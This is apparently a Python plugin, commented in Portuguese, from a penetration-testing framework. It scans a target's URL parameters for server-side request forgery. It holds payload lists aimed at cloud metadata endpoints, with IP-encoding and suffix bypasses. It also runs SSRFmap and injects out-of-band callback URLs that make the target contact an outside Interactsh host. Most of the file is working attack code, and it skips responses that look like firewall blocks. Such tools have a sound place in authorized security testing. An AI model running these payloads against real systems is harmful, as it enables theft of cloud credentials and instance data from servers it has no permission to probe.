#!/usr/bin/env python3
"""
Módulo SSRF Scanner — Utiliza SSRFmap, Interactsh (gerenciado via OastClient) e fallback nativo
V11.1: Integração com OastClient (core/oast.py)
"""
import json
import shutil
import subprocess
import time
import urllib.parse
import hashlib
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

# Payloads de metadata cloud + bypass (mantidos)
METADATA_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname", "local-ipv4", "iam"]),
    ("http://169.254.169.254/latest/user-data", ["#!/", "cloud-init", "password", "secret"]),
    ("http://2852039166/latest/meta-data/", ["ami-id", "instance-id", "hostname"]),
    ("http://[::ffff:a9fe:a9fe]/latest/meta-data/", ["ami-id", "instance-id"]),
    ("http://169.254.169.254.nip.io/latest/meta-data/", ["ami-id", "instance-id"]),
    ("http://metadata.google.internal/computeMetadata/v1/project/project-id", ["project"]),
    ("http://169.254.169.254/computeMetadata/v1/project/project-id", ["project"]),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "vmId", "location"]),
    ("http://169.254.169.254/metadata/v1.json", ["droplet_id", "hostname", "region"]),
    ("http://169.254.169.254/opc/v1/instance/", ["availabilityDomain", "compartmentId"]),
    ("http://100.100.100.200/latest/meta-data/", ["instance-id", "hostname"]),
    ("http://0x7f000001/latest/meta-data/", ["ami-id", "instance-id"]),
    ("http://0177.0.0.1/latest/meta-data/", ["ami-id", "instance-id"]),
    ("http://[::]/latest/meta-data/", ["ami-id", "instance-id"]),
]

SSRF_BYPASS_WRAPPERS = [
    "{payload}",
    "{payload}%00",
    "{payload}#",
    "{payload}?.png",
]


def _test_ssrf_native(url: str, param_name: str) -> list:
    """Teste SSRF nativo com payloads de metadata cloud."""
    import httpx
    from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY

    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if param_name not in qs:
        return findings

    try:
        with httpx.Client(timeout=8, verify=False, follow_redirects=True) as client:
            baseline_resp = client.get(url, headers={"User-Agent": DEFAULT_USER_AGENT})
            baseline_body = baseline_resp.text.lower()
            baseline_len = len(baseline_resp.text)
    except Exception:
        return findings

    with httpx.Client(timeout=8, verify=False, follow_redirects=True) as client:
        for meta_url, markers in METADATA_PAYLOADS:
            for wrapper in SSRF_BYPASS_WRAPPERS:
                final_payload = wrapper.format(payload=meta_url)
                time.sleep(REQUEST_DELAY)

                test_qs = qs.copy()
                test_qs[param_name] = [final_payload]
                new_query = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(
                    (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
                )

                try:
                    resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
                    if resp.status_code in [403, 405, 429]:
                        continue
                    body = resp.text.lower()
                    if any(ws in body for ws in ["cloudflare", "blocked", "access denied", "forbidden", "ddos"]):
                        continue

                    matched_markers = [m for m in markers if m.lower() in body and m.lower() not in baseline_body]
                    if matched_markers and abs(len(resp.text) - baseline_len) > 500:
                        findings.append({
                            "url": url,
                            "test_url": test_url,
                            "parameter": param_name,
                            "type": "SSRF",
                            "severity": "CRITICAL",
                            "payload": final_payload,
                            "matched_markers": matched_markers,
                            "details": f"SSRF Nativo: Metadata cloud detectado ({', '.join(matched_markers)})",
                            "action": "Confirmar manualmente: acesse a URL e verifique se os dados de metadata são reais.",
                            "request_raw": format_http_request(resp.request),
                            "response_raw": format_http_response(resp),
                        })
                        return findings  # Um achado por parâmetro basta
                except Exception:
                    pass
    return findings


def run(context: dict):
    target = context.get("target")
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟧───────────────────────────────────────────────────────────🟧\n"
        f"   📡 {C.BOLD}{C.CYAN}SSRF SCANNER (V11.1 — OastClient Integrado){C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟧───────────────────────────────────────────────────────────🟧\n"
    )

    outdir = ensure_outdir(target, "ssrf")
    results_file = outdir / "ssrf_results.json"

    urls_file = Path("output") / target / "urls" / "patterns" / "ssrf_ready.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "urls" / "patterns" / "ssrf_urls.txt"

    if not urls_file.exists():
        warn("   [!] Arquivo de URLs pré-filtradas para SSRF não encontrado.")
        results_file.write_text("[]")
        return [str(results_file)]

    urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
    if not urls:
        warn("   [!] Nenhuma URL candidata a SSRF detectada.")
        results_file.write_text("[]")
        return [str(results_file)]

    info(f"   📊 Testando {len(urls)} URLs injetáveis contra SSRF...")

    deduped = []

    # =============================================
    # 1. SSRFmap (ferramenta externa)
    # =============================================
    ssrfmap = shutil.which("ssrfmap")
    if ssrfmap:
        info(f"   [i] Orquestrando SSRFmap em background...")
        ssrfmap_out = outdir / "ssrfmap_raw.txt"

        def run_ssrfmap(url):
            try:
                proc = subprocess.run(
                    [ssrfmap, "-u", url, "--level", "1"],
                    capture_output=True, text=True, timeout=30
                )
                if proc.stdout and ("vulnerable" in proc.stdout.lower() or "is vulnerable" in proc.stdout.lower()):
                    return url
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(run_ssrfmap, u): u for u in urls[:50]}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    deduped.append({
                        "url": res,
                        "type": "SSRF Vulnerability",
                        "severity": "CRITICAL",
                        "details": "Detecção Ativa via SSRFmap",
                        "action": "Checar acesso a metadados do Cloud Provider ou AWS"
                    })
                    info(f"   🚨 {C.RED}SSRF Detectado:{C.END} {res}")
    else:
        warn("   [!] 'ssrfmap' não encontrado. Rodando apenas testes nativos + OAST.")

    # =============================================
    # 2. Teste nativo com payloads de metadata cloud
    # =============================================
    import httpx
    from core.config import REQUEST_DELAY

    info(f"   🔬 Executando teste nativo com {len(METADATA_PAYLOADS)} payloads de metadata cloud...")
    native_candidates = []
    for u in urls[:100]:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for param in qs:
            native_candidates.append((u, param))
    native_candidates = list(set(native_candidates))[:80]
    info(f"   📋 {len(native_candidates)} parâmetros candidatos para teste nativo...")

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(_test_ssrf_native, u, p): (u, p) for u, p in native_candidates}
        for future in as_completed(futures):
            try:
                res = future.result()
                if res:
                    deduped.extend(res)
                    for f in res:
                        info(f"   🚨 {C.RED}SSRF NATIVO Detectado:{C.END} {f['url']} via '{f['parameter']}'")
            except Exception:
                pass

    # =============================================
    # 3. OAST via OastClient (gerenciado pelo runner)
    # =============================================
    oast_client = context.get("oast")
    if oast_client:
        info("   🌐 OAST disponível. Iniciando teste de callback...")
        oast_host = oast_client.get_url()
        if not oast_host:
            warn("   ⚠️ OAST URL não definida. Pulando teste OAST.")
        else:
            # Gera um subdomínio único para tracking
            unique_sub = f"ssrf-{hashlib.md5(target.encode()).hexdigest()[:6]}"
            payload_domain = oast_client.get_url(subdomain=unique_sub)
            oast_client.add_payload(payload_domain)

            # Prepara URLs com parâmetro substituído pelo payload OAST
            oast_urls = set()
            for u in urls[:150]:
                parsed = urllib.parse.urlparse(u)
                if parsed.query:
                    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                    # Para cada parâmetro injetável, cria uma URL com o payload
                    for param in qs:
                        test_qs = qs.copy()
                        test_qs[param] = [f"http://{payload_domain}"]
                        new_query = urllib.parse.urlencode(test_qs, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                        oast_urls.add(test_url)

            if not oast_urls:
                info("   Nenhuma URL com parâmetros para injetar payload OAST.")
            else:
                info(f"   [+] Disparando {len(oast_urls)} requisições com payload OAST...")

                def send_request(url):
                    try:
                        httpx.get(url, verify=False, timeout=5)
                    except Exception:
                        pass

                with ThreadPoolExecutor(max_workers=10) as executor:
                    for u in oast_urls:
                        executor.submit(send_request, u)

                info("   [⏳] Aguardando 10s por callbacks...")
                time.sleep(10)

                # Poll do OastClient
                interactions = oast_client.poll(timeout=2)  # já esperamos 10s, poll rápido
                for entry in interactions:
                    # Verifica se o subdomínio único aparece na interação
                    if payload_domain in entry.get('full-uri', '') or payload_domain in entry.get('raw-request', ''):
                        deduped.append({
                            "url": f"Callback OAST para {payload_domain}",
                            "type": "SSRF / OAST Pingback",
                            "severity": "CRITICAL",
                            "details": f"Conexão do IP alvo: {entry.get('remote-address')} na porta {entry.get('remote-port', 'N/A')}",
                            "action": "Vulnerabilidade Confirmada! Realize SSRF Manual."
                        })
                        info(f"   🚨 {C.RED}Callback OAST Detectado de {entry.get('remote-address')}{C.END}")

                if not any("OAST" in str(d.get("type")) for d in deduped):
                    info("   ✅ Nenhum callback OAST recebido.")
    else:
        info("   ℹ️ OAST não configurado. Pulando teste de callback (apenas testes nativos executados).")

    # =============================================
    # Salvamento e finalização
    # =============================================
    results_file.write_text(json.dumps(deduped, indent=2, ensure_ascii=False))
    summary = {"urls_tested": len(urls), "findings": len(deduped), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))

    if deduped:
        success(f"💉 {len(deduped)} SSRFs detectados!")
    else:
        success("✅ Nenhum SSRF detectado.")

    return [str(results_file)]